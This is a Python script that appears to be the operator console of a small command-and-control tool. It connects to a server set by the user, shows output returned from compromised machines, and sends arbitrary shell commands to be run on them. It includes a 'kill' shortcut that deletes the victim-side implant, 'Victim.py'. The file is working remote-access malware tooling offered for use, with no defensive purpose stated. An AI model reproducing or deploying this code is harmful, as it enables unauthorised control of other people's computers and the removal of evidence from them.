import socket
import time


#Print Silly Rabbit
ascii_art = ''' 
                    ____     ____
                  /'    |   |    \ 
                /    /  |   | \   \ 
              /    / |  |   |  \   \ 
             (   /   |  """"   |\   \   
             | /   / /^\    /^\  \  _|
              ~   | |   |  |   | | ~
                  | |__O|__|O__| |
                /~~      \/     ~~\ 
               /   (      |      )  \ 
               /,   \____/^\___/'   \ 
                / -____-|_|_|-____-\ 
           _____|_/~~~~\____/~~~~\__|_____
          |____|_|     |____|     |__|____|
              | `^-^-^'    `^-^-^'    |
              |                       |    Program Created By:
              |     "Silly Rabbit,    |  github.com/Kaiden-cyber
              |                       |
              |  Root is for admins!" |
              |                       |
              |                       |
              |                       |
              |                       |
               -----------------------'''
print(ascii_art)
#Connect to the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Replace with your server IP
sock.connect(("0.0.0.0", 1337))
#Define command shortcuts in this dictionary
special_commands = {"kill" : "rm Victim.py"}
#Notify the user that we are connected to the server
print('Connected!')
#Tracks if we have received all of the input needed
hasGotten = False
while True:
    #If we already have everything disconnect from the server
    if hasGotten:
        break
    #Identifier message that gets sent when we connect
    message = "Connected from host"
    #Send the message
    sock.send(str.encode(message))
    #Store how many command outputs we will be receiving
    received = int(sock.recv(1024).decode("utf-8"))
    #Loop through command outputs
    for i in range(received):
        rec_output = sock.recv(1024).decode("utf-8")
        #Print out the received command output
        print(rec_output)
    #Ask the user how many commands they are going to send to be stored on the server
    isSending = int(input("How many commands are you sending? "))
    #If a message is being sent
    if isSending > 0:
        #Notify the server that we will be sending commands
        sock.send(str.encode("Sending Commands"))
        #Delay next message
        time.sleep(0.1)
        #Send the number of commands being sent, the variable name is a boolean beacause 
        #I thought thats what I was going to do until I didn't and im too lazy to change it
        sock.send(str.encode(str(isSending)))
        #Delay next message
        time.sleep(0.1)
        for i in range(isSending):
            #Ask the user for the next command
            command = input("What is command #" + str(i+1) + "? ")
            #If it is a shortcut send the full length command
            if command in special_commands:
                sock.send(str.encode(special_commands[command]))
            else:
                #If it is not a shortcut just send the command
                sock.send(str.encode(command))
    #If no messages are being sent termiante the session, you can chage the message to anything you want
    else:
        sock.send(str.encode("Terminate Session"))
    #On the next loop through the session terminates
    hasGotten = True
